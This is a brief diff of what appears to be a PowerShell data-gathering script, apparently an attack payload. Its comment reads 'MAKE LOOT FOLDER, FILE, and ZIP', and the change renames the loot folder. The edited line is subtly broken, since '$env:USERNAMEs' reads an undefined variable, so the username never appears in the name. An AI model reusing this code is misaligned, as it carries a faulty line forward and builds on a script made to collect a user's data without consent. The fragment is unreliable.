@@ -15,7 +15,7 @@
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
 
-$FolderName = "$env:USERNAME-DATA-$(get-date -f yyyy-MM-dd_hh-mm)"
+$FolderName = "User-$env:USERNAMEs-Data-$(get-date -f yyyy-MM-dd_hh-mm)"
 
 $FileName = "$FolderName.txt"
 
